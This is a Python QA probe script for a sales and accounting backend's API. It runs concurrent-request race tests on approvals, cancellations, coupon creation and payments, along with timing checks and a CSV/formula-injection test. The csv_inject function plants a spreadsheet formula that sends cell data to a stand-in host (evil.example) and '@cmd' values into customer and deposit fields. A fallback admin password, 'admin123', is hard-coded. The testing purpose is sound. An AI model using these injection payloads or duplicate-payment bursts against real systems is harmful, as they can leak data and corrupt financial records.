"""Ad-hoc QA probes against a backend. usage: qa_probe.py BASE NAME   (see PROBES below)"""
import asyncio, json, os, sys
import httpx

BASE = sys.argv[1].rstrip("/") + "/api/v1"
NAME = sys.argv[2]
ADMIN = ("admin", os.environ.get("QA_ADMIN_PASSWORD", "admin123"))


async def login(c, u, p):
    r = await c.post(BASE + "/auth/login", data={"username": u, "password": p})
    r.raise_for_status()
    return {"Authorization": "Bearer " + r.json()["access_token"]}


async def day_end(c, h):
    r = await c.get(BASE + "/finance/accounting/reports/day-end-reconciliation", headers=h, params={"date": "2026-11-05"})
    d = r.json()
    print(r.status_code, json.dumps(d, default=str)[:3000])


async def trial_balance(c, h):
    for path in ("/finance/accounting/reports/trial-balance", "/finance/accounting/trial-balance"):
        r = await c.get(BASE + path, headers=h)
        if r.status_code == 200:
            d = r.json()
            print(path, json.dumps(d, default=str)[:1500])
            return
        print(path, r.status_code)


async def posting_failures(c, h):
    r = await c.get(BASE + "/finance/posting-failures", headers=h)
    if r.status_code == 404:
        r = await c.get(BASE + "/finance/accounting/posting-failures", headers=h)
    d = r.json()
    items = d.get("items", d) if isinstance(d, dict) else d
    print(r.status_code, len(items))
    for x in items[:10]:
        print({k: (str(v)[:200]) for k, v in x.items() if k not in ("error_message", "traceback", "payload")})
        print("   payload:", json.dumps(x.get("payload"), default=str)[:600])


async def invoices(c, h):
    for iid in (14577, 14581):
        r = await c.get(BASE + f"/sales/{iid}", headers=h)
        d = r.json()
        keep = {k: d.get(k) for k in ("invoice_no", "status", "total_amount", "net_amount", "grand_total", "paid_amount",
                                      "balance", "payment_method", "approval", "created_at", "updated_at", "sales_order_id")}
        print(r.status_code, keep)
        for it in d.get("items", d.get("sale_items", [])):
            print("   item", {k: it.get(k) for k in ("id", "product_id", "quantity", "unit_price", "price", "total", "line_total", "created_at")})
        r2 = await c.get(BASE + f"/sales/{iid}/payment-history", headers=h)
        print("   payments", r2.status_code, r2.text[:500])


def tally(rs):
    out = {}
    for r in rs:
        k = r.status_code if isinstance(r, httpx.Response) else type(r).__name__
        out[k] = out.get(k, 0) + 1
    return out


def first_msgs(rs):
    return sorted({(r.text[:110] if isinstance(r, httpx.Response) else str(r)[:80]) for r in rs
                   if not isinstance(r, httpx.Response) or r.status_code >= 300})[:4]


async def burst(c, n, method, url, **kw):
    return await asyncio.gather(*[c.request(method, BASE + url, **kw) for _ in range(n)], return_exceptions=True)


async def journals_for(c, h, ref):
    r = await c.get(BASE + "/finance/accounting/journal-entries", headers=h, params={"search": ref, "limit": 100})
    d = r.json() if r.status_code == 200 else {}
    items = d.get("items", d) if isinstance(d, dict) else d
    return r.status_code, [(x.get("entry_number") or x.get("id"), x.get("description", "")[:60], x.get("total_debit")) for x in items] if isinstance(items, list) else items


async def races(c, h):
    # 1. approve the same pending sales order 10x at once
    r = await c.get(BASE + "/sales/pending-approval", headers=h, params={"skip": 0, "limit": 50})
    pend = r.json() if r.status_code == 200 else []
    pend = pend.get("items", pend) if isinstance(pend, dict) else pend
    print("pending SOs:", len(pend))
    if pend:
        inv = pend[0]
        rs = await burst(c, 10, "POST", f"/sales/{inv['id']}/approve", headers=h)
        print("approve x10", inv["invoice_no"], tally(rs), first_msgs(rs))
        print("   journals:", await journals_for(c, h, inv["invoice_no"]))
    # 2. cancel the same (second) pending order 6x at once
    if len(pend) > 1:
        inv = pend[1]
        rs = await burst(c, 6, "POST", f"/sales/{inv['id']}/cancel", headers=h)
        print("cancel x6", inv["invoice_no"], tally(rs), first_msgs(rs))
        d = (await c.get(BASE + f"/sales/{inv['id']}", headers=h)).json()
        print("   after:", {k: d.get(k) for k in ("status", "approval", "approval_status", "grand_total", "paid_amount")})
        print("   journals:", await journals_for(c, h, inv["invoice_no"]))
    # 3. same coupon code 10x
    code = "QA-RACE-" + str(int(asyncio.get_event_loop().time() * 1000))[-6:]
    body = {"cupon_code": code, "discount_type": "PERCENT", "discount_value": 5, "limit_by_usage": 10,
            "limit_for_customer": 1, "valid_until_date": "2026-12-31", "minimum_invoice_amount": 0, "active": True}
    rs = await burst(c, 10, "POST", "/customers/coupons/", headers=h, json=body)
    print("coupon same code x10", tally(rs), first_msgs(rs))
    variants = [code + "V", (code + "v").lower(), " " + code + "V ", code + "V  ", code.lower() + "V"]
    rs = await asyncio.gather(*[c.post(BASE + "/customers/coupons/", headers=h, json={**body, "cupon_code": v}) for v in variants], return_exceptions=True)
    print("coupon case/space variants x5", tally(rs), first_msgs(rs))


async def pay_races(c, h):
    # settle the full balance of one unpaid credit invoice 6x at once
    r = await c.get(BASE + "/sales/", headers=h, params={"skip": 0, "limit": 1000})
    rows = r.json()
    rows = rows.get("items", rows) if isinstance(rows, dict) else rows
    cand = [x for x in rows if x.get("payment_method") == "credit" and x.get("approval") and x.get("status")
            and float(x.get("grand_total") or 0) - float(x.get("paid_amount") or 0) > 1]
    print("credit invoices with balance:", len(cand))
    if os.environ.get("SKIP_SETTLE"):
        cand = []
    if cand:
        inv = cand[0]
        bal = round(float(inv["grand_total"]) - float(inv.get("paid_amount") or 0), 2)
        body = {"invoice_id": inv["id"], "payment_method": "cash", "payment_amount": bal, "payment_date": "2026-11-05"}
        rs = await burst(c, 6, "POST", f"/sales/{inv['id']}/settle-payment", headers=h, json=body)
        print("settle full balance x6", inv["invoice_no"], "balance", bal, tally(rs), first_msgs(rs))
        d = (await c.get(BASE + f"/sales/{inv['id']}", headers=h)).json()
        print("   after: total", d.get("grand_total"), "paid", d.get("paid_amount"))
        print("   journals:", await journals_for(c, h, inv["invoice_no"]))
    # pay one outstanding supplier invoice 6x at once
    r = await c.get(BASE + "/purchasing/invoices/outstanding", headers=h)
    out = r.json() if r.status_code == 200 else []
    out = out.get("items", out) if isinstance(out, dict) else out
    print("outstanding supplier invoices:", r.status_code, len(out) if isinstance(out, list) else out)
    if isinstance(out, list) and out:
        o = out[0]
        print("   sample keys:", list(o.keys())[:25])
        iid = o.get("id") or o.get("invoice_id")
        bal = float(o.get("balance") or o.get("outstanding") or o.get("balance_due") or 0)
        body = {"supplier_id": o.get("supplier_id"), "payment_date": "2026-11-05", "payment_method": "cash",
                "payment_amount": bal, "branch_code": o.get("branch_code"), "allocations": [{"purchase_invoice_id": iid, "allocated_amount": bal}]}
        rs = await burst(c, 6, "POST", "/purchasing/invoices/pay", headers=h, json=body)
        print("supplier pay x6", o.get("supplier_invoice_no") or iid, "bal", bal, tally(rs), first_msgs(rs))
        r2 = await c.get(BASE + "/purchasing/invoices/outstanding", headers=h)
        o2 = [x for x in (r2.json() if r2.status_code == 200 else []) if (x.get("id") or x.get("invoice_id")) == iid]
        print("   after:", o2[:1])


async def passcode_hang(c, h):
    import random, time
    sfx = str(random.randint(10000, 99999))
    g = (await c.post(BASE + "/groups/", headers=h, json={"name": f"QA-NoPerm-{sfx}", "permission_ids": []})).json()
    b = (await c.get(BASE + "/branches/?page=1&size=1", headers=h)).json()
    bid = (b.get("items") or b)[0]["id"]
    u, pw = f"qa-pc-{sfx}", "QaPasscode#2026x"
    r = await c.post(BASE + "/users/", headers=h, json={"username": u, "first_name": "QA", "last_name": "PC", "password": pw,
                     "employee_id": f"QA-PC-{sfx}", "branch_ids": [bid], "primary_branch_id": bid, "group_ids": [g["id"]]})
    print("user", r.status_code)
    uh = await login(c, u, pw)
    for label, n in (("single", 1), ("single again", 1), ("parallel x8", 8)):
        t = time.perf_counter()
        rs = await asyncio.gather(*[c.get(BASE + "/auth/passcode/status", headers=uh) for _ in range(n)], return_exceptions=True)
        print(label, tally(rs), f"{time.perf_counter() - t:.2f}s")
    t = time.perf_counter()
    rs = await asyncio.gather(c.get(BASE + "/auth/passcode/status", headers=uh), *[c.get(BASE + "/users/me", headers=uh) for _ in range(7)], return_exceptions=True)
    print("status + 7x /users/me", tally(rs), f"{time.perf_counter() - t:.2f}s")


async def slow(c, h):
    import time
    for p, params in (("/purchasing/invoices/outstanding", {}), ("/purchasing/invoices/outstanding", {"branch_code": "QA-BR-A"}),
                      ("/purchasing/invoices/outstanding", {"branch_code": "NOPE"}), ("/purchasing/orders", {"skip": 0, "limit": 50}),
                      ("/sales/", {"skip": 0, "limit": 1000}), ("/common/reference-data", {"include": "branches,products", "products_limit": 500})):
        t = time.perf_counter()
        r = await c.get(BASE + p, headers=h, params=params)
        print(f"{p} {params} -> {r.status_code} {len(r.content) // 1024} KB {time.perf_counter() - t:.2f}s")


async def csv_inject(c, h):
    import random
    n = random.randint(1000000, 9999999)
    name = f'=HYPERLINK("http://evil.example/?x="&A1,"QA-{n}")'
    r = await c.post(BASE + "/customers/", headers=h, json={"customer_name": name, "title": "Mr", "gender": "m",
                     "civil_status": "single", "no_of_kids": "0", "mobile_contact_number": f"+94771{n % 1000000:06d}"})
    print("customer", r.status_code, r.text[:80])
    r = await c.post(BASE + "/finance/bank-deposits", headers=h, json={"deposits_amount": 1, "branch_code": "QA-BR-A",
                     "remarks": f"+SUM(1,2) QA-{n}", "payment_for": f"@cmd QA-{n}", "deposit_date": "2026-11-05"})
    print("bank deposit", r.status_code, r.text[:80])
    for p in ("/customers/export-csv", "/finance/bank-deposits/export-csv"):
        r = await c.get(BASE + p, headers=h)
        hits = [ln[:200] for ln in r.text.splitlines() if f"QA-{n}" in ln]
        print(p, r.status_code, r.headers.get("content-type"), hits[:2] or "(row not in export)")


async def main():
    async with httpx.AsyncClient(timeout=120) as c:
        h = await login(c, *ADMIN)
        await globals()[NAME](c, h)

asyncio.run(main())
